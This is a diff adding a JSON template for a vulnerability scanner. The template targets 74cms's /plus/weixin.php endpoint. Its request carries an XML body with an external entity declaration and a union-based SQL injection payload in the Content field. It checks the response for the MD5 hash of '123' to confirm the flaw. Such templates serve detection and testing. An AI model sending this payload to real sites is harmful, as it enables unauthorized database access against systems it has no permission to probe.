@@ -1,0 +1,33 @@
+{
+    "Name": "74cms-sqli-1",
+    "Description": "74cms-sqli-1",
+    "Product": "骑士cms",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+            "Content-Type":"text/xml"},
+        "Uri":"/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\\xc3\\x97tamp=&nonce=",
+        "Port":"",
+        "Data":"<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE copyright [<!ENTITY test SYSTEM \"file:///\">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5(123)#</Content></xml>",
+        "follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "202cb962ac59075b964b07152d234b70"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":""
+        }
+    ]}
